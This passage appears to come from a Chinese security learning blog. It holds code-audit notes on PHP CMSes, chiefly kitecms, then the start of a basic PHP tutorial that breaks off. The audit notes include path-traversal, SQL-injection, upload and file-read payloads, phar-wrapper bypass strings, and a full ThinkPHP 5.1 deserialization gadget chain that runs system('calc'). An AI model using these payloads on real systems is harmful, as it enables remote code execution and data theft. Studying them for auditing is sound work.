alt=""></p><p>这里的<code>mlname</code>可控，他传入文件夹名给<code>ml</code>然后遍历整个文件夹下的文件，最将文件名赋值给<code>file</code>然后通过<code>unlink</code>删除</p><p>当文件夹下的文件全部被删除后再通过<code>rmdir</code>删除传入的文件夹</p><p>payload：<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">/admin/uploadfile_nouse.php?action=del&amp;mlname=..\文件夹名字</span><br><span class="line"></span><br></pre></td></tr></table></figure></p><h2 id="前端xss漏洞"><a href="#前端xss漏洞" class="headerlink" title="前端xss漏洞"></a>前端xss漏洞</h2><p>该系统没有按照mvc开发模式进行开发，导致大部分前后端代码都在一个php文件中，</p><p><img src="https://pic.imgdb.cn/item/670def3bd29ded1a8cd10b09.png" alt=""></p><p>这里的两个参数<code>imgid</code>和<code>noshuiyin</code>参数可控，</p><p><img src="https://pic.imgdb.cn/item/670dfa34d29ded1a8cd9de07.png" alt=""></p><h2 id="sql注入"><a href="#sql注入" class="headerlink" title="sql注入"></a>sql注入</h2><p>这里的<code>classname</code>是可控的，从上面要求<code>action=modify</code>是一个条件，</p><p><img src="https://pic.imgdb.cn/item/6710c0a3d29ded1a8c00f6b5.png" alt=""></p><p>从这php开头可以看到<code>dowhat</code>是可控的</p><p><img src="https://pic.imgdb.cn/item/6710c098d29ded1a8c00ed73.png" alt=""></p><p>所以应该还有个条件是<code>dowhat=modifybigclass</code></p><p><img src="https://pic.imgdb.cn/item/6710c13dd29ded1a8c016c12.png" alt=""></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">payload=classname= xxxxxxx（自己填写sql语句）</span><br></pre></td></tr></table></figure><h2 id="总结："><a href="#总结：" class="headerlink" title="总结："></a>总结：</h2><ol><li>如果限制了登录失败次数像是10次这种，可以看源码中是否通过ip来进行限制的，如果是的话可以在爆破的时候将ip的第一位也爆破一下</li><li>sql注入的相关漏洞可以看<code>select *</code>这种的东西，后面看是否传入的参数可控</li><li>还是危险函数</li><li>在正常的使用中可能有些不是传统的mvn框架所以我们要对目事先录框架进行分析</li><li>可以使用Fortify以及seay等工具对参数先进行分析，这样方便我们后期的审计</li></ol>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>kitecms代码审计</title>
      <link href="/2025/01/08/2024%E5%B9%B410%E6%9C%8811%E6%97%A5-kitecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/"/>
      <url>/2025/01/08/2024%E5%B9%B410%E6%9C%8811%E6%97%A5-kitecms%E4%BB%A3%E7%A0%81%E5%AE%A1%E8%AE%A1/</url>
      
        <content type="html"><![CDATA[<p>kitecms是基于thinkphp5搭建的，这个我搭建的时候按照两个方法都失败了，访问<code>/install</code>的时候安装不跳转，数据库安装倒是成功了<code>/config/database.php</code>也配置好了但是访问的时候报错</p><p>就很奇怪</p><p>所以我就单纯的看着教程和源码进行审计学习了</p><p>thinkphp5.1比较上一代5.0，将配置目录和路由定义单独出来不在防御应用类库目录中（不可更改哦）</p><h2 id="目录架构"><a href="#目录架构" class="headerlink" title="目录架构"></a>目录架构</h2><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br></pre></td><td class="code"><pre><span class="line">www WEB部署目录（或者子目录）</span><br><span class="line">├─application           应用目录</span><br><span class="line">│ ├─common             公共模块目录（可以更改）</span><br><span class="line">│ ├─module_name       模块目录</span><br><span class="line">│ │ ├─common.php     模块函数文件</span><br><span class="line">│ │ ├─controller     控制器目录</span><br><span class="line">│ │ ├─model           模型目录</span><br><span class="line">│ │ ├─view           视图目录</span><br><span class="line">│ │ ├─config         配置目录</span><br><span class="line">│ │ └─ ...           更多类库目录</span><br><span class="line">│ │</span><br><span class="line">│ ├─command.php       命令行定义文件</span><br><span class="line">│ ├─common.php         公共函数文件</span><br><span class="line">│ └─tags.php           应用行为扩展定义文件</span><br><span class="line">│</span><br><span class="line">├─config               应用配置目录</span><br><span class="line">│ ├─module_name       模块配置目录</span><br><span class="line">│ │ ├─database.php   数据库配置</span><br><span class="line">│ │ ├─cache           缓存配置</span><br><span class="line">│ │ └─ ...</span><br><span class="line">│ │</span><br><span class="line">│ ├─app.php           应用配置 相当于5.0中config.php</span><br><span class="line">│ ├─cache.php         缓存配置</span><br><span class="line">│ ├─cookie.php         Cookie配置</span><br><span class="line">│ ├─database.php       数据库配置</span><br><span class="line">│ ├─log.php           日志配置</span><br><span class="line">│ ├─session.php       Session配置</span><br><span class="line">│ ├─template.php       模板引擎配置</span><br><span class="line">│ └─trace.php         Trace配置</span><br><span class="line">│</span><br><span class="line">├─route                 路由定义目录</span><br><span class="line">│ ├─route.php         路由定义</span><br><span class="line">│ └─...               更多</span><br><span class="line">│</span><br><span class="line">├─public               WEB目录（对外访问目录）</span><br><span class="line">│ ├─index.php         入口文件</span><br><span class="line">│ ├─router.php         快速测试文件</span><br><span class="line">│ └─.htaccess         用于apache的重写</span><br><span class="line">│</span><br><span class="line">├─thinkphp             框架系统目录</span><br><span class="line">│ ├─lang               语言文件目录</span><br><span class="line">│ ├─library           框架类库目录</span><br><span class="line">│ │ ├─think           Think类库包目录</span><br><span class="line">│ │ └─traits         系统Trait目录</span><br><span class="line">│ │</span><br><span class="line">│ ├─tpl               系统模板目录</span><br><span class="line">│ ├─base.php           基础定义文件</span><br><span class="line">│ ├─convention.php     框架惯例配置文件</span><br><span class="line">│ ├─helper.php         助手函数文件</span><br><span class="line">│ └─logo.png           框架LOGO文件</span><br><span class="line">│</span><br><span class="line">├─extend               扩展类库目录</span><br><span class="line">├─runtime               应用的运行时目录（可写，可定制）</span><br><span class="line">├─vendor               第三方类库目录（Composer依赖库）</span><br><span class="line">├─build.php             自动生成定义文件（参考）</span><br><span class="line">├─composer.json         composer 定义文件</span><br><span class="line">├─LICENSE.txt           授权说明文件</span><br><span class="line">├─README.md             README 文件</span><br><span class="line">├─think                 命令行入口文件</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><h2 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h2><p>由于该系统使用的是thinkphp框架，所以我们在审计的时候需要着重观察application文件夹下面的文件，</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">├admin                        后台代码</span><br><span class="line">├index                        前台代码</span><br><span class="line">├install                      安装代码</span><br><span class="line">├member                       用户注册以及会员的响应代码</span><br></pre></td></tr></table></figure><h3 id="文件上传漏洞"><a href="#文件上传漏洞" class="headerlink" title="文件上传漏洞"></a>文件上传漏洞</h3><p>（我没搭建成功，所以用的是教程里面的）</p><p><img src="https://pic.imgdb.cn/item/6708c4bdd29ded1a8c820b42.png" alt=""><br>这里是对上传的文件进行了配置，</p><p>这里教程选择抓包查看路由配置信息</p><p><img src="https://pic.imgdb.cn/item/6708cf8bd29ded1a8c8b3bc4.png" alt=""></p><p><code>admin</code>的<code>site</code>的<code>config</code>，这里的html是伪静态，其实还是调用的<code>config()</code>方法</p><p>（我们可以在<code>config</code>的<code>app.php</code>中看到他开了伪静态）</p><p><img src="https://pic.imgdb.cn/item/6708d18bd29ded1a8c8cd1f8.png" alt=""></p><p>打开<code>site.php</code>，查看里面的<code>config</code>函数</p><p><img src="https://pic.imgdb.cn/item/6708d864d29ded1a8c92876f.png" alt=""></p><p>20行调用了<code>isAjax</code>判断是否是Ajax请求，然后通过<code>Request::param</code>获取来自前端的数据并存储到<code>$request</code>中，</p><p><img src="https://pic.imgdb.cn/item/6708e17dd29ded1a8c9be074.png" alt=""></p><p>刚刚应该是在哦后台的时候添加了一个php的文件使得其可传输，所以我们我们抓一个上传的包看一眼就可以了</p><p>上传包中都调用了<code>uploadFile</code>方法，全局搜索一下</p><p><img src="https://pic.imgdb.cn/item/6708e213d29ded1a8c9c9ea2.png" alt=""></p><p>这里调用了<code>Request::file</code>函数接收来自上传的文件,</p><p>这里启了一个uploadfile的函数是获取当前站点id然后创建一个新的<code>uploadfile</code>的实例，跟踪一下</p><p><img src="https://pic.imgdb.cn/item/6708e2e0d29ded1a8c9d8d80.png" alt=""></p><p><img src="https://pic.imgdb.cn/item/6708e354d29ded1a8c9df8c6.png" alt=""></p><p>首先从<code>config\site.php</code>获取site中的<code>uploadfile</code>和<code>imagewater</code>并且将其通过<code>array_merge</code>合并到一起，然后获取我们之前传入数据库的内容与配置文件进行合并</p><p><img src="https://pic.imgdb.cn/item/6708e55bd29ded1a8ca06927.png" alt=""></p><p>这里也做了一些限制</p><p>继续顺着<code>uploadfile</code>，下面调用了<code>upload</code>函数，这里使用了<code>filetype</code>获取上传类型然后通过check检查后缀以及大小</p><p><img src="https://pic.imgdb.cn/item/6708e600d29ded1a8ca129fd.png" alt=""></p><p>case完了以后通过<code>upload</code>实现文件上传</p><p>所以我们只需要在后台设置<code>.php</code>可上传，然后传就可以了</p><h2 id="任意文件读写"><a href="#任意文件读写" class="headerlink" title="任意文件读写"></a>任意文件读写</h2><p>通过全局搜索我们发现存在<code>file_put_contents</code>函数，</p><p><img src="https://pic.imgdb.cn/item/670906eed29ded1a8cc0288e.png" alt=""></p><p>而且里面的<code>html</code>参数可控，也就是说<code>file_put_contents</code>传入的内容可控</p><p><code>htmlspecialchars_decode</code>是将由<code>htmlspecialchars</code>转换的html尸体进行解码，在前面的<code>rootpath</code>向上回溯发现是将根路径、主题文件夹、主题名称和文件相对路径拼接成一个完整的文件路径</p><p><img src="https://pic.imgdb.cn/item/670909e1d29ded1a8cc24cef.png" alt=""></p><p>这里的<code>$rootpath</code>通过param接收<code>$path</code>，而path是request获得的path路径，所以这个地方的<code>$path</code>可控</p><p><img src="https://pic.imgdb.cn/item/67090af7d29ded1a8cc31ab3.png" alt=""></p><p><img src="https://pic.imgdb.cn/item/67090b05d29ded1a8cc32612.png" alt=""></p><p><img src="https://pic.imgdb.cn/item/67090a8bd29ded1a8cc2cf87.png" alt=""></p><p>这里 相当于本来在<code>404.txt</code>中写但是改成了在<code>robots.txt</code>中加了一句<code>ceshi</code>,实现了任意文件读写</p><h2 id="任意文件读取"><a href="#任意文件读取" class="headerlink" title="任意文件读取"></a>任意文件读取</h2><p>全局搜索<code>file_get_contents</code>，发现在上面那个<code>file_put_contents</code>的在一个函数中，分析一下发现</p><p><img src="https://pic.imgdb.cn/item/6709262cd29ded1a8cd89d33.png" alt=""></p><p>他判断是不是post传参，如果不是的话走下面的else判断里面的<code>rootpath</code>，上面我们分析了<code>rootpath</code>里面的<code>$path</code>可控，所以这里会造成任意文件读取</p><p><img src="https://pic.imgdb.cn/item/670927f3d29ded1a8cd9facd.png" alt=""></p><p>它上面最后调用了<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">return $this-&gt;fetch(&#x27;fileedit&#x27;, $data);</span><br></pre></td></tr></table></figure><br>渲染<code>filedit</code>并将<code>$data</code>传给他</p><p>所以存在任意文件读取</p><p><img src="https://pic.imgdb.cn/item/67092889d29ded1a8cda81b5.png" alt=""></p><p><img src="https://pic.imgdb.cn/item/670928a6d29ded1a8cda9cda.png" alt=""></p><h2 id="phar反序列化"><a href="#phar反序列化" class="headerlink" title="phar反序列化"></a>phar反序列化</h2><p>php使用的是内置的流包装器实现复杂的文件处理共嗯，内置包装器可用与文件系统函数</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"></span><br><span class="line">file:// — 访问本地文件系统，在用文件系统函数时默认就使用该包装器</span><br><span class="line">http:// — 访问 HTTP(s) 网址</span><br><span class="line">ftp:// — 访问 FTP(s) URLs</span><br><span class="line">php:// — 访问各个输入/输出流（I/O streams）</span><br><span class="line">zlib:// — 压缩流</span><br><span class="line">data:// — 数据（RFC 2397）</span><br><span class="line">glob:// — 查找匹配的文件路径模式</span><br><span class="line">phar:// — PHP 归档</span><br><span class="line">ssh2:// — Secure Shell 2</span><br><span class="line">rar:// — RAR</span><br><span class="line">ogg:// — 音频流</span><br><span class="line">expect:// — 处理交互式的流</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p><img src="https://pic.imgdb.cn/item/6709305dd29ded1a8ce15840.png" alt=""></p><h3 id="phar生成"><a href="#phar生成" class="headerlink" title="phar生成"></a>phar生成</h3><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">    class TestObject &#123;</span><br><span class="line">    &#125;</span><br><span class="line">    $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span><br><span class="line">    $phar-&gt;startBuffering();</span><br><span class="line">    $phar-&gt;setStub(&quot;&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">    $o = new TestObject();</span><br><span class="line">    $o -&gt; data=&#x27;hu3sky&#x27;;</span><br><span class="line">    $phar-&gt;setMetadata($o); //将自定义的meta-data存入manifest</span><br><span class="line">    $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">    //签名自动计算</span><br><span class="line">    $phar-&gt;stopBuffering();</span><br><span class="line">?&gt;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h3 id="phar文件必要的结构组成"><a href="#phar文件必要的结构组成" class="headerlink" title="phar文件必要的结构组成"></a>phar文件必要的结构组成</h3><blockquote><p>stub:phar文件的标志，必须以 xxx __HALT_COMPILER();?&gt; 结尾，否则无法识别。xxx可以为自定义内容。</p><p>manifest:phar文件本质上是一种压缩文件，其中每个被压缩文件的权限、属性等信息都放在这部分。这部分还会以序列化的形式存储用户自定义的meta-data，这是漏洞利用最核心的地方。</p><p>content:被压缩文件的内容</p><p>signature (可空):签名，放在末尾。</p></blockquote><h3 id="绕过方法："><a href="#绕过方法：" class="headerlink" title="绕过方法："></a>绕过方法：</h3><p>环境限制phar不能出现在前面的字符中，可以使用<code>compress.bzip2://</code>和<code>compress.bzip://</code>进行绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">compress.bzip://phar:///test.phar/test.txt</span><br><span class="line">compress.bzip2://phar:///test.phar/test.txt</span><br><span class="line">compress.zlib://phar:///home/sx/test.phar/test.txt</span><br><span class="line"></span><br></pre></td></tr></table></figure><p>或者使用其他协议</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">php://filter/read=convert.base64-encode/resource=phar://phar.phar</span><br><span class="line"></span><br><span class="line"></span><br></pre></td></tr></table></figure><p>GIF格式验证中可以通过在文件头部添加GIT89a绕过</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">- $phar-&gt;setStub(&quot;GIF89a&quot;,&quot;&lt;?php __HALT_COMPILER();?&gt;&quot;);</span><br><span class="line"></span><br><span class="line">- 生成一个phar.phar 改名为phar.gif</span><br></pre></td></tr></table></figure><h3 id="危害"><a href="#危害" class="headerlink" title="危害"></a>危害</h3><p>攻击者可以通过PHAR反序列化漏洞来实现一下攻击：</p><ol><li>远程代码执行：攻击者可以利用反序列化漏洞来远程执行任意php代码并获取服务器完全控制权</li><li>信息泄露：攻击者可以利用反序列化漏洞来读取服务器上的敏感数据，如数据库凭证，身份验证密码等</li><li>篡改数据：攻击者可以利用反序列化漏洞改变服务器上的数据，如篡改网站内容，篡改数据库数据等</li></ol><h3 id="防范措施"><a href="#防范措施" class="headerlink" title="防范措施"></a>防范措施</h3><ol><li>及时更新代码中利用phar的库或插件，以修复已知的漏洞</li><li>对用户输入的信息进行过滤和验证，确保输入的数据不包含恶意代码</li><li>金庸不必要的反序列化对象或者对反序列化对象进行严格控制</li><li>使用php的反序列化检测攻击检查潜在的远程代码执行漏洞</li></ol><p>这里的<code>$dir</code>参数完全可控，并且进入<code>is_dir()</code></p><p><img src="https://pic.imgdb.cn/item/670a40cdd29ded1a8cb1d949.png" alt=""></p><p>写tp5.1反序列化利用链生成phar文件<br><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">namespace think\process\pipes &#123;</span><br><span class="line">  class Windows</span><br><span class="line"> &#123;</span><br><span class="line">    private $files;</span><br><span class="line">    public function __construct($files)</span><br><span class="line">   &#123;</span><br><span class="line">      $this-&gt;files = [$files];</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\model\concern &#123;</span><br><span class="line">  trait Conversion</span><br><span class="line"> &#123;</span><br><span class="line"> &#125;</span><br><span class="line">  trait Attribute</span><br><span class="line"> &#123;</span><br><span class="line">    private $data;</span><br><span class="line">    private $withAttr = [&quot;v&quot; =&gt; &quot;system&quot;];</span><br><span class="line">    public function get()</span><br><span class="line">   &#123;</span><br><span class="line">      $this-&gt;data = [&quot;v&quot; =&gt; &quot;calc&quot;];</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">#这里生成我们的pahr文件，如果生成时报错了可以将php.ini配置文件中的phar.readonly选项设置为</span><br><span class="line">#Off就可以成功生成了。</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line">namespace think &#123;</span><br><span class="line">  abstract class Model</span><br><span class="line"> &#123;</span><br><span class="line">    use model\concern\Attribute;</span><br><span class="line">    use model\concern\Conversion;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace think\model&#123;</span><br><span class="line">  use think\Model;</span><br><span class="line">  class Pivot extends Model</span><br><span class="line"> &#123;</span><br><span class="line">    public function __construct()</span><br><span class="line">   &#123;</span><br><span class="line">      $this-&gt;get();</span><br><span class="line">   &#125;</span><br><span class="line"> &#125;</span><br><span class="line">&#125;</span><br><span class="line">namespace &#123;</span><br><span class="line">  $conver = new think\model\Pivot();</span><br><span class="line">  $a = new think\process\pipes\Windows($conver);</span><br><span class="line">  @unlink(&quot;phar.phar&quot;);</span><br><span class="line">  $phar = new Phar(&quot;phar.phar&quot;); //后缀名必须为phar</span><br><span class="line">  $phar-&gt;startBuffering();</span><br><span class="line">  $phar-&gt;setStub(&quot;GIF89a&lt;?php __HALT_COMPILER(); ?&gt;&quot;); //设置stub</span><br><span class="line">  $phar-&gt;setMetadata($a); //将自定义的meta-data存入manifest</span><br><span class="line">  $phar-&gt;addFromString(&quot;test.txt&quot;, &quot;test&quot;); //添加要压缩的文件</span><br><span class="line">//签名自动计算</span><br><span class="line">  $phar-&gt;stopBuffering();</span><br><span class="line">&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure></p><p>打开访问会自动生成<code>phar.phar</code>（如果报错的话是因为你的<code>php.ini</code>里面没打开<code>phar_onreadly=off</code>）</p><p><img src="https://pic.imgdb.cn/item/670b4891d29ded1a8c85b6c1.png" alt=""></p><p>在010editor里面能看到我们的数据都写进去了</p><p><img src="https://pic.imgdb.cn/item/670b48b0d29ded1a8c85ccf0.png" alt=""></p><p>漏洞复现里面是在kitecms里面上传了phar.phar，改后缀为<code>.jpg</code>,</p><p><img src="https://pic.imgdb.cn/item/670b4912d29ded1a8c861136.png" alt=""></p><p>用phar协议解析就可以弹计算器</p><p><img src="https://pic.imgdb.cn/item/670b4949d29ded1a8c8636fb.png" alt=""></p><p><img src="https://pic.imgdb.cn/item/670b497ad29ded1a8c865846.png" alt=""></p><p>顺便补一句这个下面的<code>$dir</code>也是可控的，所以也可以利用</p><p><a href="http://127.0.0.1/admin/admin/scanFilesForTree?dir=phar://地址">http://127.0.0.1/admin/admin/scanFilesForTree?dir=phar://地址</a></p><h2 id="日志文件泄露"><a href="#日志文件泄露" class="headerlink" title="日志文件泄露"></a>日志文件泄露</h2><p><img src="https://pic.imgdb.cn/item/670b4ff7d29ded1a8c8e0aa3.png" alt=""></p><p>在<code>config/app.php/log</code>中开启了调试模式，</p><p><img src="https://pic.imgdb.cn/item/670b505bd29ded1a8c8f353c.png" alt=""></p><p>也就是说开启了日志记录</p><p><a href="https://pic.imgdb.cn/item/670b50a9d29ded1a8c902826.png">https://pic.imgdb.cn/item/670b50a9d29ded1a8c902826.png</a></p><p>在日志配置文件<code>config/log.php</code>里面发现默认开启了日志记录</p><p>访问<code>/runtime/log</code>目录，使用bp求情就能得到log日志文件</p><h2 id="文件上传第二处"><a href="#文件上传第二处" class="headerlink" title="文件上传第二处"></a>文件上传第二处</h2><p><code>application/member/controller/Upload.php</code></p><p><img src="https://pic.imgdb.cn/item/670b524ed29ded1a8c983e37.png" alt=""></p><p>跟踪一下<code>upload</code>函数发现</p><p>他只检查了后缀和大小，</p><p><img src="https://pic.imgdb.cn/item/670b52b8d29ded1a8c993f0a.png" alt=""></p><p>所以可以在会员中心，对着这个</p><p><img src="https://pic.imgdb.cn/item/670b5317d29ded1a8c9a4b8d.png" alt=""></p><p>然后修改上传的png为php</p><p><img src="https://pic.imgdb.cn/item/670b532fd29ded1a8c9aca51.png" alt=""></p><p>就能访问到phpinfo文件了</p>]]></content>
      
      
      <categories>
          
          <category> 代码审计 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> php </tag>
            
            <tag> 代码审计 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>PHP学习</title>
      <link href="/2025/01/08/2023%E5%B9%B47%E6%9C%881%E6%97%A5-PHP%E5%AD%A6%E4%B9%A0/"/>
      <url>/2025/01/08/2023%E5%B9%B47%E6%9C%881%E6%97%A5-PHP%E5%AD%A6%E4%B9%A0/</url>
      
        <content type="html"><![CDATA[<h1 id="php学习"><a href="#php学习" class="headerlink" title="php学习"></a><strong>php学习</strong></h1><h2 id="echo函数"><a href="#echo函数" class="headerlink" title="echo函数"></a><strong>echo函数</strong></h2><p><strong>echo是一个语言结构，使用的时候可以不用加括号，也可以加上括号、</strong></p><h5 id="用法"><a href="#用法" class="headerlink" title="用法"></a><strong>用法</strong></h5><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">echo&quot;&quot;</span><br><span class="line">echo(&quot;&quot;)</span><br></pre></td></tr></table></figure><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?</span></span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;&lt;h2&gt;这是一个PHP！&lt;h2&gt;&quot;</span>;</span><br><span class="line"><span class="keyword">echo</span>(<span class="string">&quot;我要学php&lt;br&gt;&quot;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">&quot;PHP很好玩&lt;br&gt;&quot;</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p><strong>标准输出</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">这是一个PHP！</span><br><span class="line">我要学php</span><br><span class="line">PHP很好玩</span><br></pre></td></tr></table></figure><p><strong>在上面的语言中</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;br&gt;换行</span><br><span class="line">&lt;h2&gt;二级标题</span><br></pre></td></tr></table></figure><p><strong>当然也可以不用这样</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">$txt1=&quot;学习 PHP&quot;;</span><br><span class="line">$txt2=&quot;RUNOOB.COM&quot;;</span><br><span class="line">$cars=array(&quot;Volvo&quot;,&quot;BMW&quot;,&quot;Toyota&quot;);</span><br><span class="line"></span><br><span class="line">echo $txt1;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;在 $txt2 学习 PHP &quot;;</span><br><span class="line">echo &quot;&lt;br&gt;&quot;;</span><br><span class="line">echo &quot;我车的品牌是 &#123;$cars[0]&#125;&quot;;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure><p><strong>标准输出</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">学习 PHP</span><br><span class="line">在 RUNOOB.COM 学习 PHP </span><br><span class="line">我车的品牌是 Volvo</span><br></pre></td></tr></table></figure><p><strong>array[]是数组函数</strong></p><p><strong><a href="https://developer.mozilla.org/zh-CN/docs/Web/JavaScript/Reference/Global_Objects/Array">Array - JavaScript | MDN (mozilla.org)</a></strong></p><h2 id="print函数"><a href="#print函数" class="headerlink" title="print函数"></a><strong>print函数</strong></h2><p><strong>print同样是一个语言结构，可以使用括号，也可以不使用</strong></p><p><strong>用法</strong></p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">print&quot;&quot;</span><br><span class="line">print(&quot;&quot;)</span><br></pre></td></tr></table></figure><p><strong>具体用法和echo一样，就不过多叙述</strong></p><h2 id="PHP-EOF（heredoc"><a href="#PHP-EOF（heredoc" class="headerlink" title="PHP-EOF（heredoc"></a><strong>PHP-EOF（<a href="http://www.baidu.com/link?url=2Z7us7hFWorCxCSjhpGbWyu4bidI37Qp0Q5CrhXk6rLlnwKsO72h3GE1TjfCxsE0"><em>heredoc</em></a></strong></h2><p><strong>PHP-EOF是一种定界符</strong></p><p><strong>是一种在命令行shell（如sh、csh、ksh、bash、PowerShell和zsh）和程序语言（像Perl、PHP、Python和Ruby）里定义一个字符串的方法。</strong></p><h4 id="条件："><a href="#条件：" class="headerlink" 